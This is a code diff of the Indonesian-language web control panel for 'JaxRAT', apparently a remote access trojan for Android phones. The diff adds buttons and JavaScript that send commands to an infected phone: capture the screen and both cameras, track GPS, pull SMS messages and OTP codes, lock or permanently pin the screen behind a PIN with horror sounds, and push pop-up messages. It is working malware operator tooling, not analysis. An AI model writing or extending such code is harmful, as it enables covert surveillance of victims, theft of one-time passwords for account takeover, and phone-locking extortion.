@@ -3,52 +3,254 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JaxRAT - Kontrol</title>
+    <title>JaxRAT v1 - Kontrol</title>
     <style>
-        body { background-color: #0a0a0a; color: #00ff00; font-family: monospace; text-align: center; padding: 20px; }
-        h1 { text-shadow: 0 0 10px #00ff00; }
-        .btn { background-color: #000; color: #00ff00; border: 2px solid #00ff00; padding: 15px 20px; margin: 5px; font-size: 16px; cursor: pointer; }
-        .btn:hover { background-color: #00ff00; color: #000; }
-        #status-box { margin: 20px 0; padding: 10px; border: 1px dashed #00ff00; font-weight: bold; }
-        .btn-panic { border-color: red; color: red; font-weight: bold; }
-        .btn-panic:hover { background-color: red; color: black; }
+        body { background-color: #050505; color: #ffffff; font-family: 'Courier New', Courier, monospace; padding: 16px; margin: 0; -webkit-tap-highlight-color: transparent; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
+        .header h1 { font-size: 20px; color: #00ff00; text-shadow: 0 0 10px rgba(0, 255, 0, 0.5); margin: 0; }
+        .btn-back { background: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px 15px; text-decoration: none; font-weight: bold; border-radius: 8px; }
+        
+        .btn-panic { background-color: #2a0000; color: #ff3b30; border: 2px solid #ff3b30; width: 100%; padding: 20px; font-size: 20px; font-weight: bold; border-radius: 16px; margin-bottom: 20px; font-family: inherit; cursor: pointer; box-shadow: 0 0 15px rgba(255, 59, 48, 0.3); }
+        .btn-panic:active { background-color: #ff3b30; color: #000; }
+
+        .card { background-color: #121212; border: 2px solid #2a2a2a; border-radius: 24px; margin-bottom: 20px; overflow: hidden; transition: 0.1s; }
+        .card-header { padding: 24px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
+        .card-header:active { background-color: #222; }
+        .card-left { display: flex; align-items: center; gap: 20px; }
+        
+        .icon-box { width: 60px; height: 60px; border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 32px; flex-shrink: 0;}
+        .icon-yellow { background: rgba(255, 204, 0, 0.15); box-shadow: 0 0 15px rgba(255, 204, 0, 0.3); }
+        .icon-red { background: rgba(255, 59, 48, 0.15); box-shadow: 0 0 15px rgba(255, 59, 48, 0.3); }
+        .icon-blue { background: rgba(0, 122, 255, 0.15); box-shadow: 0 0 15px rgba(0, 122, 255, 0.3); }
+        .icon-green { background: rgba(0, 255, 102, 0.15); box-shadow: 0 0 15px rgba(0, 255, 102, 0.3); }
+        .icon-purple { background: rgba(175, 82, 222, 0.15); box-shadow: 0 0 15px rgba(175, 82, 222, 0.3); }
+
+        .text-container { display: flex; flex-direction: column; }
+        .title { font-size: 22px; font-weight: bold; color: #f0f0f0; margin-bottom: 6px; }
+        .subtitle { font-size: 14px; color: #888; }
+        .arrow { color: #555; font-size: 28px; transition: transform 0.3s; }
+        .arrow.rotated { transform: rotate(90deg); color: #00ff00; }
+
+        .switch { position: relative; display: inline-block; width: 64px; height: 36px; flex-shrink: 0; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .3s; border-radius: 36px; }
+        .slider:before { position: absolute; content: ""; height: 28px; width: 28px; left: 4px; bottom: 4px; background-color: #ccc; transition: .3s; border-radius: 50%; }
+        input:checked + .slider { background-color: #00ff00; }
+        input:checked + .slider:before { transform: translateX(28px); background-color: #000; }
+
+        .sub-menu { max-height: 0; overflow: hidden; transition: max-height 0.4s ease-out; background-color: #0a0a0a; border-top: 0px solid #2a2a2a; }
+        .sub-menu.active { max-height: 1000px; border-top: 2px solid #2a2a2a; }
+        .sub-menu-content { padding: 20px; }
+
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 18px; color: #ccc; margin-bottom: 10px; font-weight: bold; }
+        .form-group input, .form-group select { width: 100%; padding: 18px; border-radius: 12px; background-color: #1a1a1a; border: 2px solid #444; color: #fff; font-size: 18px; font-family: inherit; box-sizing: border-box; }
+        
+        .action-btn { width: 100%; padding: 20px; margin-top: 10px; background-color: #00ff00; color: #000; border: none; border-radius: 12px; font-size: 20px; font-weight: bold; font-family: inherit; }
+        .action-btn:active { background-color: #00cc00; transform: scale(0.98); }
+        .action-btn-red { background-color: #ff3b30; color: #fff; }
+
+        .status { margin-bottom: 20px; padding: 15px; border: 1px dashed #00ff00; text-align: center; font-size: 16px; color: #00ff00; background: #001100; border-radius: 10px;}
     </style>
 </head>
 <body>
-    <h1>[ KONTROL: {{ device.name }} ]</h1>
-    
-    <div id="status-box">Menunggu perintah...</div>
 
-    <button class="btn btn-panic" onclick="kirimPerintah('STOP_ALL')">🚨 PANIC STOP 🚨</button><br><br>
+    <div class="header">
+        <h1>[ {{ device.name }} ]</h1>
+        <a href="/" class="btn-back">← Kembali</a>
+    </div>
 
-    <button class="btn" onclick="kirimPerintah('flash_on')">💡 NYALA</button>
-    <button class="btn" onclick="kirimPerintah('flash_off')">🔌 MATI</button>
-    <button class="btn" onclick="kirimPerintah('flash_strobe')">⚡ KELAP-KELIP</button><br><br>
+    <div class="status" id="status-box">Menunggu perintah...</div>
 
-    <button class="btn" onclick="kirimPerintah('lock_device')">📴 KUNCI LAYAR</button>
-    <button class="btn" onclick="kirimPerintah('screenshot')">📸 SCREENSHOT</button><br><br>
+    <button class="btn-panic" onclick="kirimPerintah('STOP_ALL')">🚨 HENTIKAN SEMUA (PANIC) 🚨</button>
 
-    <a href="/" class="btn" style="text-decoration: none; display: inline-block;">← Kembali</a>
+    <!-- 1. SENTER -->
+    <div class="card">
+        <div class="card-header">
+            <div class="card-left">
+                <div class="icon-box icon-yellow">🔦</div>
+                <div class="text-container">
+                    <div class="title">Senter</div>
+                    <div class="subtitle">Kelap-kelip (Strobe)</div>
+                </div>
+            </div>
+            <label class="switch">
+                <input type="checkbox" id="switch_senter" onchange="toggleSenter(this)">
+                <span class="slider"></span>
+            </label>
+        </div>
+    </div>
+
+    <!-- 2. KUNCI LAYAR HP -->
+    <div class="card">
+        <div class="card-header" onclick="kirimPerintah('lock_device')">
+            <div class="card-left">
+                <div class="icon-box icon-purple">📴</div>
+                <div class="text-container">
+                    <div class="title">Kunci Layar HP</div>
+                    <div class="subtitle">Matikan layar seketika</div>
+                </div>
+            </div>
+            <div class="arrow">❯</div>
+        </div>
+    </div>
+
+    <!-- 3. SCREEN PINNING -->
+    <div class="card">
+        <div class="card-header" onclick="toggleMenu('menu_pinning', this)">
+            <div class="card-left">
+                <div class="icon-box icon-red">🔒</div>
+                <div class="text-container">
+                    <div class="title">Screen Pinning</div>
+                    <div class="subtitle">Kunci Custom & Timer</div>
+                </div>
+            </div>
+            <div class="arrow">❯</div>
+        </div>
+
+        <div class="sub-menu" id="menu_pinning">
+            <div class="sub-menu-content">
+                <div class="form-group">
+                    <label>Durasi Kunci</label>
+                    <select id="pin_timer">
+                        <option value="60">1 Menit</option>
+                        <option value="3600">1 Jam</option>
+                        <option value="86400">1 Hari</option>
+                        <option value="0">Permanen</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>PIN Angka</label>
+                    <input type="text" id="pin_code" placeholder="Contoh: 1234" maxlength="6">
+                </div>
+                <div class="form-group">
+                    <label>Efek Suara</label>
+                    <select id="pin_suara">
+                        <option value="none">Tanpa Suara</option>
+                        <option value="horor">Suara Horor</option>
+                    </select>
+                </div>
+                <div class="form-group" style="display: flex; justify-content: space-between; align-items: center;">
+                    <label style="margin:0;">Volume Maksimal</label>
+                    <label class="switch">
+                        <input type="checkbox" id="pin_volume" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <button class="action-btn" onclick="kirimPin()">KUNCI & SEMATKAN</button>
+                <button class="action-btn action-btn-red" style="margin-top:15px;" onclick="kirimPerintah('unpin_screen')">LEPAS SEMATAN</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 4. PESAN POP-UP -->
+    <div class="card">
+        <div class="card-header" onclick="toggleMenu('menu_pesan', this)">
+            <div class="card-left">
+                <div class="icon-box icon-green">💬</div>
+                <div class="text-container">
+                    <div class="title">Pesan Pop-up</div>
+                    <div class="subtitle">Kirim teks ke layar HP</div>
+                </div>
+            </div>
+            <div class="arrow">❯</div>
+        </div>
+        <div class="sub-menu" id="menu_pesan">
+            <div class="sub-menu-content">
+                <div class="form-group">
+                    <label>Pesan</label>
+                    <input type="text" id="msg_text" placeholder="Ketik pesan...">
+                </div>
+                <button class="action-btn" onclick="kirimPesan()">KIRIM PESAN</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 5. DATA & SPY -->
+    <div class="card">
+        <div class="card-header" onclick="toggleMenu('menu_spy', this)">
+            <div class="card-left">
+                <div class="icon-box icon-blue">🕵️</div>
+                <div class="text-container">
+                    <div class="title">Data & Spy</div>
+                    <div class="subtitle">Screenshot, GPS, SMS, dll</div>
+                </div>
+            </div>
+            <div class="arrow">❯</div>
+        </div>
+        <div class="sub-menu" id="menu_spy">
+            <div class="sub-menu-content" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                <button class="action-btn" onclick="kirimPerintah('screenshot')">📸 Screenshot</button>
+                <button class="action-btn" onclick="kirimPerintah('camera_front')">🤳 Kamera Depan</button>
+                <button class="action-btn" onclick="kirimPerintah('camera_back')">📷 Kamera Belakang</button>
+                <button class="action-btn" onclick="kirimPerintah('get_gps')">📍 Lacak GPS</button>
+                <button class="action-btn" onclick="kirimPerintah('get_sms')">📩 Ambil SMS</button>
+                <button class="action-btn" onclick="kirimPerintah('get_otp')">🔑 Ambil OTP</button>
+            </div>
+        </div>
+    </div>
 
     <script>
-        const deviceId = "{{ device_id }}";
-        const statusBox = document.getElementById('status-box');
+        var deviceId = "{{ device_id }}";
+        var statusBox = document.getElementById('status-box');
+
+        function toggleMenu(menuId, headerElement) {
+            var menu = document.getElementById(menuId);
+            var arrow = headerElement.querySelector('.arrow');
+            
+            if (menu.classList.contains('active')) {
+                menu.classList.remove('active');
+                if(arrow) arrow.classList.remove('rotated');
+            } else {
+                menu.classList.add('active');
+                if(arrow) arrow.classList.add('rotated');
+            }
+        }
 
         function kirimPerintah(cmd) {
-            statusBox.innerText = "Mengirim...";
+            statusBox.innerText = "Mengirim perintah...";
             
             fetch('/api/command/' + deviceId, {
-                method: 'POST',
+                method: 'POST', 
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ command: cmd })
             })
-            .then(res => res.json())
-            .then(data => {
+            .then(function(response) {
+                if(!response.ok) throw new Error('Sesi login habis.');
+                return response.json();
+            })
+            .then(function(data) {
                 statusBox.innerText = "✅ Terkirim: " + cmd;
             })
-            .catch(err => {
-                statusBox.innerText = "❌ Gagal konek ke server!";
+            .catch(function(error) {
+                statusBox.innerText = "❌ GAGAL: " + error.message;
             });
+        }
+
+        function toggleSenter(checkbox) {
+            if(checkbox.checked) {
+                kirimPerintah('flash_strobe');
+            } else {
+                kirimPerintah('flash_off');
+            }
+        }
+
+        function kirimPin() {
+            var timer = document.getElementById('pin_timer').value;
+            var pin = document.getElementById('pin_code').value;
+            var suara = document.getElementById('pin_suara').value;
+            var vol = document.getElementById('pin_volume').checked ? "1" : "0";
+
+            if(!pin) { alert("PIN tidak boleh kosong!"); return; }
+
+            var cmd = "pin|" + timer + "|" + suara + "|1|" + vol + "|Terkunci|" + pin;
+            kirimPerintah(cmd);
+        }
+
+        function kirimPesan() {
+            var psn = document.getElementById('msg_text').value;
+            if(!psn) { alert("Pesan kosong!"); return; }
+            kirimPerintah('msg|' + psn);
         }
     </script>
 </body>
